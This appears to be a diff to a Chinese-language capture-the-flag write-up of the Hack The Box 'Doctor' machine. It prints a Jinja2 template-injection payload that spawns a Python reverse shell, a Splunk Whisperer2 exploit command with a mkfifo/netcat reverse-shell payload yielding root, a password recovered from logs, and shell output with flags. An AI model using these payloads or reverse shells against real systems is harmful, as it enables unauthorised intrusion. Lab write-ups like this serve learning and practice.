@@ -169,6 +169,7 @@ Target: http://10.10.10.209/
 
 把doctors.htb加入到```/etc/hosts```
 
+echo "10.10.10.209 doctors.htb" >> /etc/hosts
 
 打开```http://doctors.htb```跳转到一个登陆页面，这个页面之前用IP访问的时候无法访问到
 
@@ -261,6 +262,157 @@ Content:```${7*7}```
 
 由上可知。title里面的```7*7```被当成了python代码执行
 
-
-
+下面payload拿到rev shell
+```
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.10.16.4\",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+```
+
+访问```/archive```触发
+```
+┌──(root💀kali)-[~/htb/doctor]
+└─# nc -lnvp 443
+listening on [any] 443 ...
+connect to [10.10.16.4] from (UNKNOWN) [10.10.10.209] 41604
+bash: cannot set terminal process group (875): Inappropriate ioctl for device
+bash: no job control in this shell
+web@doctor:~$ id
+id
+uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
+web@doctor:~$ whoami
+whoami
+web
+web@doctor:~$ 
+
+```
+
+
+# 提权 
+
+传linpeas
+
+有一个重启触发的定时任务
+```
+@reboot /home/web/blog.sh
+```
+
+bash文件可写，但是当前账号没有重启权限
+
+
+找到一个哈希，但是貌似不可以被爆破
+```
+ -> Extracting tables from /opt/clean/site.db (limit 20)
+  --> Found interesting column names in user (output limit 10)                                                      
+CREATE TABLE user (
+        id INTEGER NOT NULL, 
+        username VARCHAR(20) NOT NULL, 
+        email VARCHAR(120) NOT NULL, 
+        image_file VARCHAR(20) NOT NULL, 
+        password VARCHAR(60) NOT NULL, 
+        PRIMARY KEY (id), 
+        UNIQUE (username), 
+        UNIQUE (email)
+)
+1, admin, admin@doctor.htb, default.gif, $2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S
+
+```
+
+
+
+日志文件有一个优点奇怪的东西
+"POST /reset_password?email=Guitar123" 里的这个Guitar123不像是邮箱，倒像是密码
+
+```
+╔══════════╣ Searching passwords inside logs (limit 70)
+10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
+[    5.233165] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+[    5.605047] systemd[1]: Condition check resulted in Dispatch Password Requests to Console Directory Watch being skipped.
+[    5.605161] systemd[1]: Started Forward Password Requests to Plymouth Directory Watch.
+[    5.666833] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+Binary file /var/log/apache2/access.log.12.gz matches
+```
+
+尝试su一个用户
+```
+web@doctor:/tmp$ su shaun
+su shaun
+Password: Guitar123
+id
+uid=1002(shaun) gid=1002(shaun) groups=1002(shaun)
+whoami
+shaun
+
+```
+是shaun的密码
+
+
+拿到user flag
+```
+shaun@doctor:~$ cat user.txt
+cat user.txt
+cdec0fff1bd6278d..
+
+```
+
+## 回到8089端口服务
+
+使用```shaun：Guitar123```登录web auth，可以成功登录
+
+
+使用[这个exp](https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py)
+
+
+```
+┌──(root💀kali)-[~/htb/doctor]
+└─# python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --lhost 10.10.16.4 --lport 443 --username shaun --password 'Guitar123' --payload "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 8089 >/tmp/f"
+Running in remote mode (Remote Code Execution)
+[.] Authenticating...
+[+] Authenticated
+[.] Creating malicious app bundle...
+[+] Created malicious app bundle in: /tmp/tmp8dhv64n6.tar
+[+] Started HTTP server for remote mode
+[.] Installing app from: http://10.10.16.4:443/
+10.10.10.209 - - [25/May/2022 06:14:42] "GET / HTTP/1.1" 200 -
+[+] App installed, your code should be running now!
+
+Press RETURN to cleanup
+
+```
+
+
+收到root shell
+```
+┌──(root💀kali)-[~/htb/doctor]
+└─# nc -lnvp 8089                                                                             1 ⨯
+listening on [any] 8089 ...
+connect to [10.10.16.4] from (UNKNOWN) [10.10.10.209] 50182
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# whoami
+root
+# cat /root/root.txt
+99bb7d228d041..
+# 
+
+```
+
+
+
+## 另一种方法？
+
+
+python有cap_sys_ptrace+ep能力
+
+
+/usr/bin/python3.8 = cap_sys_ptrace+ep
+
+
+参考这两篇文章：
+```
+https://www.cnblogs.com/zlgxzswjy/p/15185591.html
+https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc
+```
+
+貌似可以提权，但是上面提供的pytho版本是2，靶机是python3，需要改一下脚本
+
+e
